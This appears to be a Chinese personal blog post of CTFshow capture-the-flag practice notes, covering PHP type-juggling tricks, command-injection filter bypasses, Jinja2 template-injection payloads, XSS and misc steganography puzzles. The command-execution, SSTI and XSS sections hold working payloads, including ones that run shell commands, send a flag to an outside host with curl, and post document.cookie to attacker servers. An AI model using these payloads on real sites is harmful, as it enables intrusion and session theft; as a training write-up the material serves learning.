---
title: "CTFshow wp"
date: 2021-08-10 00:00:00
updated: 2022-12-13 23:22:25
tags:
  - ctf
description: "刷题记录"
---

# PHP特性

刷题整理…待补充

### 1

变量覆盖函数

```
extract()
parse_str()
```

读取变量

```
get_defined_vars
超全局变量
implode — 将一个一维数组的值转化为字符串
$_GLOBALS
```

```
ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配
```

异常处理类

```
Exception
ReflectionClass
```

```
getchwd() 函数返回当前工作目录。
FilesystemIterator(getcwd)
```

伪协议

```
//支持伪协议
php://filter/resource=flag.php
php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
php://filter/read=convert.quoted-printable-encode/resource=flag.php
****compress.zlib://flag.php
//传入一个伪协议时 is_file返回false 不影响file_get_content highlight_file
php://filter/read=string.rot13/resource=flag.php
```

未解

```
/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
lf/root/proc/self/root/var/www/html/flag.php
//目录溢出
```

```
在num加空格绕过is_numeric()
%20 %09 %0c
trim — 去除字符串首尾处的空白字符（或者其他字符）
" " (ASCII 32 (0x20))，普通空格符。
"\t" (ASCII 9 (0x09))，制表符。
"\n" (ASCII 10 (0x0A))，换行符。
"\r" (ASCII 13 (0x0D))，回车符。
"\0" (ASCII 0 (0x00))，空字节符。
"\x0B" (ASCII 11 (0x0B))，垂直制表符。
```

### 2

```php
if(preg_match("/[0-9]/", $num)){
die("no no no!");
}
if(intval($num)){
echo $flag;
}
```

preg_match不匹配数组，传入num[]=1

[在线进制转换 (oschina.net)](https://tool.oschina.net/hexconvert)

```php
if($num==="4476"){
die("no no no!");
}
if(intval($num,0)===4476){
echo $flag;
}else{
echo intval($num,0);
}
```

进制绕过 16进制，8进制，空格加八进制 小数点 科学计数法

php7以后传参的十六进制会解析为字符串 这里intval会强制转换

### 3

[(26条消息) PHP正则表达式 /i, /s, /x,/u, /U, /A, /D, /S等模式修饰符_cjsyr_cjsyr的专栏-CSDN博客_php 正则u](https://blog.csdn.net/cjsyr_cjsyr/article/details/53688984)

```php
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
```

/im 匹配多行 /i 匹配单行 传入a%0aphp %0a -> \n

### 4

md5查看博客[MD5 – Staryのblog](http://ip/index.php/2021/08/05/md5/)

sha1比较

```
GET V2[]=1
POST V1[]=2
sha1(Array[])=NULL

aaK1STfY
0e76658526655756207688271159624026011393
aaO8zKZF
0e89257456677279068558073954252716165668
```

### 5

```php
include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
```

没关报错，用报错把flag爆出来

### 6

```php
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}
```

in_array弱比较？？

14.php也可以。。。

### 7

[PHP运算符优先级一览表 (biancheng.net)](http://c.biancheng.net/view/7272.html)

先赋值再and

```php
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
$v0=is_numeric($v1);
```

### 8

反射类**ReflectionClass** 类报告了一个类的有关信息。

```php
echo new Reflectionclass
```

### 9

```
hex2bin(5044383959474e6864434171594473)=PD89YGNhdCAqYDs
base64-decode(PD89YGNhdCAqYDs)='<?=`cat *`;'
```

# ctfshow命令执行

搜索引擎[http://helosec.com/](http://helosec.com/)
正则解释[https://regexper.com/](https://regexper.com/)

### web31

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

过滤
flag system php cat sort shell . 空格 ’

payload:?c=eval($_GET[1]);&1=system(“cat flag.php”);

官方wp show_source(next(array_reverse(scandir(pos(localeconv())))));
array_reverse：以相反的元素顺序返回数组
scandir： 列出指定路径中的文件和目录
pos？？？
localeconv() 函数返回一包含本地数字及货币格式信息的数组。？？？？？

### web32

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

payload: ?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
include：利用文件包含
php伪协议：php://filter/read=convert.base64-encode/resource=flag.php 用base64编码读取文件
base64在线解码：[https://base64.us/](https://base64.us/)

官方wp：c=$nice=include$_GET[“url”]?>&url=php://filter/read=convert.base64 encode/resource=flag.php
?>代替分号

### web33

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

过滤 “flag” “system” “php” “cat” “sort” “shell” “.” “ ” “’” “`” “echo” “;” “(” “””
payload: ?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
include：利用文件包含
php伪协议：php://filter/read=convert.base64-encode/resource=flag.php 用base64编码读取文件
base64在线解码：[https://base64.us/](https://base64.us/)

官方wp：c=?>&1=php://filter/read=convert.base64-
encode/resource=flag.php
?><?干啥用？？？？？

### web34

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

payload: ?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
官方wp：c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php

### web35

。。。。。一模一样

### web36

过滤数字把上面的1换成a

### web 37

```php
<?php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

data伪协议
payload:?c=data://text/plain,
POST A=cat flag.php
官方wp：data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==

### web38

过滤php
把
POST A=cat flag.php

### web39

如上
hint：data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用

### web40

```php
<?php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }        
}else{
    highlight_file(__FILE__);
}
```

过滤的中文括号
读取当前文件夹文件：?c=print_r(scandir(pos(localeconv())));
payload：?c=show_source(next(array_reverse(scandir(pos(localeconv())))));

localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)
pos()：返回数组中当前元素的值
scandir()：获取目录下的文件
array_reverse()：将数组逆序排列
next()：函数将内部指针指向下一元素，并输出

官方wp：
show_source(next(array_reverse(scandir(pos(localeconv())))));
GXYCTF的禁止套娃 通过cookie获得参数进行命令执行
c=session_start();system(session_id());
passid=ls

### web41

不会来个大佬教我！！！

### web42

payload：c=ls;%0a也行||也行
;执行多个命令

### web43

; cat 过滤
用%0a 和 tac 等等

### web44

; cat flag过滤
用%0a 和 tac fla?.php fla*.php fl\ag.php等等

### web45

过滤空格
echo$IFS`tac$IFS*`%0A
payload：/?c=tac${IFS}fla?.php%0a
system中 ${IFS}代替空格

### web46 web47 web48 web 49 web50

```
tac|more|less|curl|nl|tail|sort|strings读取
```

过滤了$
%09代替
/?c=tac%09fla?.php%0a（web50过滤%09）
nl<fla’’g.php||（查看源码）

### web51

过滤$,nl
用nl${IFS}fla’’g.php||

# ctfshow ssti

## 361

猜测参数是name

```
payload:

{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}

{{x.__init__.__globals__['__builtins__'].eval('__import__("os").popen("ls").read()')}}
```

执行任意命令

## 362

上面一个可以过

## 363

```python
{{request["__cl"+"a"+"ss__"].mro()[-1]['__subcla'+'sses__']()[182].__init__['__glob'+'als__']['__builtins__']['__imp'+'ort__']('os').__dict__['pop'+'en']('ls').read()}}
```

## 363

过滤引号

```
?name={{[].__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.arg1](request.args.arg2).read()}}&arg1=popen&arg2=cat /flag
```

## 364

过滤args

```
?name={{[].__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.cookies.x1](request.cookies.x2).read()}}

cookies:x1=popen;x2=cat /flag
```

## 365

过滤方括号

```
?name={{().__class__.__base__.__subclasses__().pop(132).__init__.__globals__.popen(request.cookies.arg2).read()}}

cookie:arg2=cat /flag
```

## 366–367

```
?name={{(x|attr(request.cookies.w1)|attr(request.cookies.w2)|attr(request.cookies.w3))(request.cookies.w4).eval(request.cookies.w5)}}



Cookie:w1=__init__;w2=__globals__;w3=__getitem__;w4=__builtins__;w5=__import__('os').popen('cat /flag').read()
```

```
{{x.__init__.__globals__['__builtins__'].eval('__import__("os").popen("ls").read()')}}
```

## 368

```
?name={%print((x|attr(request.cookies.w1)|attr(request.cookies.w2)|attr(request.cookies.w3))(request.cookies.w4).eval(request.cookies.w5))%}

Cookie:w1=__init__;w2=__globals__;w3=__getitem__;w4=__builtins__;w5=__import__('os').popen('cat /flag').read()
```

## 369

[(89条消息) SSTI模板注入绕过（进阶篇）_羽的博客-CSDN博客_ssti绕过](https://blog.csdn.net/miuzzx/article/details/110220425)

```python
{% set a=(()|select|string|list).pop(24)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=
%}
{%if x.eval(cmd)%}
123
{%endif%}


s='__import__("os").popen("curl http://xxx:4567?p=`cat /flag`").read()'
def ccchr(s):
	t=''
	for i in range(len(s)):
		if i<len(s)-1:
			t+='chr('+str(ord(s[i]))+')%2b'
		else:
			t+='chr('+str(ord(s[i]))+')'
	return t
```

# ctfshow xss

## 基本

```javascript
<script>
var img=document.createElement("img"); img.src="http://47.106.248.56/123.php?1="+document.cookie;
</script>

<script>window.open('http://ip/php/123.php?1='+document.cookie)</script>

<script>window.location.href='http://ip/php/123.php?1='+document.cookie</script>

<script>location.href='http://47.106.248.56/123.php?1='+document.cookie</script>

<input onfocus="window.open('http://47.106.248.56/123.php?1='+document.cookie)" autofocus>

<svg onload="window.open('http://118.31.168.198:39543/'+document.cookie)">

<svg onload="window.open('http://118.31.168.198:39543/'+document.cookie)">
    
<iframe onload="window.open('http://118.31.168.198:39543/'+document.cookie)"></iframe>

<body onload="window.open('http://47.106.248.56/123.php?'+document.cookie)">
```

### 320

```js
<body/onload="window.open('http://47.106.248.56/123.php?1='+document.cookie)">
```

### 321

```js
<iframe/onload="window.open('http://47.106.248.56/123.php?1='+document.cookie)"></iframe>
```

### 322

```js
<body/onload="window.open('http://47.106.248.56/123.php?1='+document.cookie)">
```

## 329

```
<script>window.open('http://ip/php/123.php?1='+document.getElementsByTagName('html')[0].innerHTML</script>
```

## 330

```
var img = new Image();
img.src = "http://ip/php/123.php?1="+document.querySelector('#top > div.layui-container').tex    tContent;
document.body.append(img);

<script src="http://ip/php/xss.js"></script>

<script>window.open('http://ip/php/123.php?1='+document.querySelector('#top > div.layui-container').textContent)</script>
```

## 331

```html
var httpRequest = new XMLHttpRequest();//第一步：创建需要的对象
httpRequest.open('POST', 'url', true); //第二步：打开连接
httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");//设置请求头 注：post方式必须设置请求头（在建立连接后设置请求头）
httpRequest.send('name=teswe&ee=ef');//发送请求 将情头体写在send中
/**
 * 获取数据后的处理程序
 */
httpRequest.onreadystatechange = function () {//请求后的回调接口，可将请求成功后要执行的程序写在其中
    if (httpRequest.readyState == 4 && httpRequest.status == 200) {//验证请求是否发送成功
        var json = httpRequest.responseText;//获取到服务端返回的数据
        console.log(json);
    }
};


<script>var httpRequest = new XMLHttpRequest();httpRequest.open('POST', 'http://127.0.0.1/api/amount.php', true);httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");httpRequest.send('u=123&a=100000');</script>

<script>window.open('http://ip/php/123.php?1='+document.querySelector('#top > div.layui-container').textContent)</script>
```

## 332

```
<script src=http:********111.js></script>
```

```js
$.ajax({
                url: "http://127.0.0.1/api/amount.php",
                method: "POST",
                data:{
                    'u':'123',
                    'a':10000
                },
                cache: false,
                success: function(res){
                    
            }});
```

[XMLHttpRequest—必知必会 - 简书 (jianshu.com)](https://www.jianshu.com/p/918c63045bc3/)

[xss其他标签下的js用法总结大全 - Hookjoy - 博客园 (cnblogs.com)](https://www.cnblogs.com/hookjoy/p/6181350.html)

# Ctfshow Misc

作者 [STARY](http://ip/index.php/author/stary/)

所用工具 binwalk foremost exiftool bpgviewer tweakpng zsteg

## 1

直接给了

## 2

打开txt文件一堆乱码

搜索flag未果

改文件格式为.jpg得到flag

010查看文件头png。。。没差

## 3

用bpgviewer打开

## 4

改后缀拼起来就是

## 5

010打开在最后几行

## 6

010打开找的到

## 7

010搜素ctfshow

## 8

binwalk和foremost分离得到图片flag

[CTF中图片隐藏文件分离方法总结 – 夹心果果 – 博客园 (cnblogs.com)](https://www.cnblogs.com/jiaxinguoguo/p/7351202.html)

## 9

010搜索

## 10

binwalk分解得到文件

打开就是

## 11

tweakpng删除第一个IDAT块得到新图片

IDAT？

## 12

删IDAT块。。有什么讲究吗

## 13

![img](https://raw.githubusercontent.com/L1aovo/blogpic/master/img/image.png)

这地方像flag

每两中间有个多余的

python删掉发现flag不对

看了wp发现16进制的不一样。。。。。wtm？？

## 14

binwalk查看

手动分离jpg

[分离方法总结 – 夹心果果 – 博客园 (cnblogs.com)](https://www.cnblogs.com/jiaxinguoguo/p/7351202.html)

## 15

010打开

## 16

binwalk分离，flag在DD4这个文件里，具体原理还不清楚

## 17

看wp 需要先用zsteg提取数据，然后再用binwalk分离，最后得到一张png即为flag

zsteg 17.png

zsteg -E ‘extradata:0’ misc17.png > 17.tmp

binwalk 17.png -e

[(27条消息) 隐写工具zsteg安装和使用方法_丶没胡子的猫-CSDN博客_zsteg安装](https://blog.csdn.net/weixin_41924764/article/details/114674740)

## 18

![img](https://raw.githubusercontent.com/L1aovo/blogpic/master/img/image-1.png)

拼接一下

用exiftool工具读

## 19

用exiftool工具读

## 20

exif

西替爱抚秀大括号西九七九六四必一诶易西爱抚零六易一弟七九西二一弟弟诶弟五九三易四二大括号
